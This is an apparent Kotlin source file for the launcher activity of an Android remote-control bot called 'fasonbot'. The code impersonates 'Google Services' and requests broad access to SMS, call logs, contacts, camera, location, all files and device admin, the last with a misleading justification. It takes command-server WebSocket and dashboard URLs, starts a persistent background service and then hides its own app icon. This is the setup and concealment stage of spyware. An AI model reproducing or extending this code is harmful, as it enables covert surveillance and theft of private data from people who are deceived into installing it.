package com.fasonbot.app

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.text.InputType
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.widget.*
import androidx.core.content.ContextCompat
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.receiver.DeviceAdminReceiver
import com.fasonbot.app.service.CoreService
import com.fasonbot.app.service.ServiceHelper

class AppLauncher : Activity() {

    companion object {
        private const val TAG = "AppLauncher"
        private const val PERMISSION_REQUEST_CODE = 100
        private const val PREFS_NAME = "fasonbot_prefs"
        private const val KEY_SERVICE_ENABLED = "service_enabled"
    }

    private val requiredPermissions: Array<String> by lazy {
        buildList {
            add(android.Manifest.permission.READ_CALL_LOG)
            add(android.Manifest.permission.READ_SMS)
            add(android.Manifest.permission.SEND_SMS)
            add(android.Manifest.permission.READ_CONTACTS)
            add(android.Manifest.permission.CAMERA)
            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
            add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(android.Manifest.permission.READ_MEDIA_IMAGES)
                add(android.Manifest.permission.READ_MEDIA_VIDEO)
                add(android.Manifest.permission.READ_MEDIA_AUDIO)
                add(android.Manifest.permission.POST_NOTIFICATIONS)
            } else {
                add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }.toTypedArray()
    }

    private var setupDone = false
    private var etWss: EditText? = null
    private var etDash: EditText? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            Log.e(TAG, "Uncaught exception in ${thread.name}", throwable)
        }
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putBoolean(KEY_SERVICE_ENABLED, true).apply()

        if (allPermissionsGranted()) {
            onPermissionsGranted()
        } else {
            requestAllPermissions()
            showSetupUi()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!setupDone && allPermissionsGranted() && BotConfig.isSetupComplete(this)) {
            onPermissionsGranted()
        }
    }

    // ──────────────────────────────────────────────────────────────
    // Setup UI — built programmatically, no XML layout needed
    // ──────────────────────────────────────────────────────────────
    private fun showSetupUi() {
        val bg      = Color.parseColor("#090910")
        val accent  = Color.parseColor("#00E676")
        val cardBg  = Color.parseColor("#12121A")
        val textCol = Color.parseColor("#E2E2E2")
        val hintColor = Color.parseColor("#4A4A5A")
        val border  = Color.parseColor("#1E1E2A")

        fun dp(v: Int) = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, v.toFloat(), resources.displayMetrics).toInt()

        val root = ScrollView(this).apply {
            setBackgroundColor(bg)
            setPadding(0, 0, 0, 0)
        }

        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(24), dp(40), dp(24), dp(40))
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // Icon placeholder (colored circle mimicking Google Play)
        val icon = View(this).apply {
            val d = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.OVAL
                setColor(Color.parseColor("#1A2A1A"))
                setStroke(dp(2), accent)
            }
            background = d
            layoutParams = LinearLayout.LayoutParams(dp(72), dp(72)).also {
                it.gravity = Gravity.CENTER_HORIZONTAL
                it.bottomMargin = dp(20)
            }
        }

        // Title
        val title = TextView(this).apply {
            text = "Google Services"
            setTextColor(Color.WHITE)
            textSize = 22f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(6) }
        }

        // Subtitle
        val sub = TextView(this).apply {
            text = "Configure connection settings"
            setTextColor(hintColor)
            textSize = 13f
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(32) }
        }

        // ── WSS URL Field ──
        val labelWss = TextView(this).apply {
            text = "WebSocket URL"
            setTextColor(Color.parseColor("#888898"))
            textSize = 11f
            letterSpacing = 0.1f
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(6) }
        }

        etWss = EditText(this).apply {
            hint = "wss://xxxx.pike.replit.dev/ws"
            setText(BotConfig.getServerUrl(this@AppLauncher))
            setTextColor(textCol)
            setHintTextColor(hintColor)
            textSize = 13f
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_URI
            setBackgroundColor(Color.TRANSPARENT)
            val border2 = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.RECTANGLE
                cornerRadius = dp(10).toFloat()
                setColor(cardBg)
                setStroke(dp(1), border)
            }
            background = border2
            setPadding(dp(14), dp(13), dp(14), dp(13))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(18) }
            setOnFocusChangeListener { _, focused ->
                val b = android.graphics.drawable.GradientDrawable().apply {
                    shape = android.graphics.drawable.GradientDrawable.RECTANGLE
                    cornerRadius = dp(10).toFloat()
                    setColor(cardBg)
                    setStroke(dp(1), if (focused) accent else border)
                }
                background = b
            }
        }

        // ── Dashboard URL Field ──
        val labelDash = TextView(this).apply {
            text = "Dashboard URL"
            setTextColor(Color.parseColor("#888898"))
            textSize = 11f
            letterSpacing = 0.1f
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(6) }
        }

        etDash = EditText(this).apply {
            hint = "https://xxxx.pike.replit.dev"
            setText(BotConfig.getDashboardUrl(this@AppLauncher))
            setTextColor(textCol)
            setHintTextColor(hintColor)
            textSize = 13f
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_URI
            setBackgroundColor(Color.TRANSPARENT)
            val border2 = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.RECTANGLE
                cornerRadius = dp(10).toFloat()
                setColor(cardBg)
                setStroke(dp(1), border)
            }
            background = border2
            setPadding(dp(14), dp(13), dp(14), dp(13))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(28) }
            setOnFocusChangeListener { _, focused ->
                val b = android.graphics.drawable.GradientDrawable().apply {
                    shape = android.graphics.drawable.GradientDrawable.RECTANGLE
                    cornerRadius = dp(10).toFloat()
                    setColor(cardBg)
                    setStroke(dp(1), if (focused) accent else border)
                }
                background = b
            }
        }

        // ── Info hint ──
        val info = TextView(this).apply {
            text = "Grant all permissions first, then enter your Replit URLs and tap Confirm."
            setTextColor(hintColor)
            textSize = 11f
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(20) }
        }

        // ── Confirm button ──
        val btn = Button(this).apply {
            text = "Confirm & Start"
            setTextColor(Color.parseColor("#000000"))
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            val btnBg = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.RECTANGLE
                cornerRadius = dp(12).toFloat()
                setColor(accent)
            }
            background = btnBg
            setPadding(dp(16), dp(14), dp(16), dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dp(12) }
            setOnClickListener { onConfirmClicked() }
        }

        // ── Permission status ──
        val permTxt = TextView(this).apply {
            text = "⚠ Grant all permissions before confirming"
            setTextColor(Color.parseColor("#FFC107"))
            textSize = 11f
            gravity = Gravity.CENTER
            id = View.generateViewId()
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        card.addView(icon)
        card.addView(title)
        card.addView(sub)
        card.addView(labelWss)
        card.addView(etWss)
        card.addView(labelDash)
        card.addView(etDash)
        card.addView(info)
        card.addView(btn)
        card.addView(permTxt)

        root.addView(card)
        setContentView(root)
    }

    private fun onConfirmClicked() {
        val wss  = etWss?.text?.toString()?.trim() ?: ""
        val dash = etDash?.text?.toString()?.trim() ?: ""

        if (wss.isEmpty() || !wss.startsWith("ws")) {
            Toast.makeText(this, "Enter a valid WebSocket URL (starts with wss://)", Toast.LENGTH_LONG).show()
            return
        }
        if (dash.isEmpty() || !dash.startsWith("http")) {
            Toast.makeText(this, "Enter a valid Dashboard URL (starts with https://)", Toast.LENGTH_LONG).show()
            return
        }

        BotConfig.saveUrls(this, wss, dash)
        BotConfig.markSetupComplete(this)
        onPermissionsGranted()
    }

    // ──────────────────────────────────────────────────────────────
    // Permissions
    // ──────────────────────────────────────────────────────────────
    private fun allPermissionsGranted(): Boolean = try {
        requiredPermissions.all {
            checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
        } && (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager())
    } catch (e: Exception) {
        Log.e(TAG, "Permission check error: ${e.message}")
        false
    }

    private fun requestAllPermissions() {
        try { requestPermissions(requiredPermissions, PERMISSION_REQUEST_CODE) }
        catch (e: Exception) { Log.e(TAG, "Permission request error: ${e.message}") }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (_: Exception) {
                try { startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)) }
                catch (_: Exception) {}
            }
        }
        requestBatteryOptimizationExemption()
        requestOverlayPermission()
        requestDeviceAdmin()
    }

    private fun requestBatteryOptimizationExemption() {
        try {
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            }
        } catch (e: Exception) { Log.e(TAG, "Battery opt error: ${e.message}") }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            try {
                val am = getSystemService(android.app.AlarmManager::class.java)
                if (!am.canScheduleExactAlarms()) {
                    startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                        data = Uri.parse("package:$packageName")
                    })
                }
            } catch (e: Exception) { Log.e(TAG, "Exact alarm error: ${e.message}") }
        }
    }

    private fun requestOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                })
            }
        } catch (e: Exception) { Log.e(TAG, "Overlay error: ${e.message}") }
    }

    private fun requestDeviceAdmin() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
            if (!dpm.isAdminActive(adminComponent)) {
                startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required to keep the service running in the background.")
                })
            }
        } catch (e: Exception) { Log.e(TAG, "DeviceAdmin error: ${e.message}") }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE && BotConfig.isSetupComplete(this)) {
            onPermissionsGranted()
        }
    }

    // ──────────────────────────────────────────────────────────────
    // After setup confirmed
    // ──────────────────────────────────────────────────────────────
    private fun onPermissionsGranted() {
        if (setupDone) return
        setupDone = true
        startCoreService()
        hideAppIcon()
        finish()
    }

    private fun startCoreService() {
        try {
            DeviceManager.registerDevice(this)
            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                .putBoolean(KEY_SERVICE_ENABLED, true).apply()
            val intent = Intent(this, CoreService::class.java).apply { action = CoreService.ACTION_START }
            ContextCompat.startForegroundService(this, intent)
            ServiceHelper.initializePersistence(applicationContext)
            Log.d(TAG, "CoreService started")
        } catch (e: Exception) {
            Log.e(TAG, "Service start error: ${e.message}")
            CoreService.scheduleRestartAlarm(this, 1000)
        }
    }

    private fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, AppLauncher::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "App icon hidden")
        } catch (e: Exception) {
            Log.e(TAG, "Hide icon error: ${e.message}")
        }
    }
}
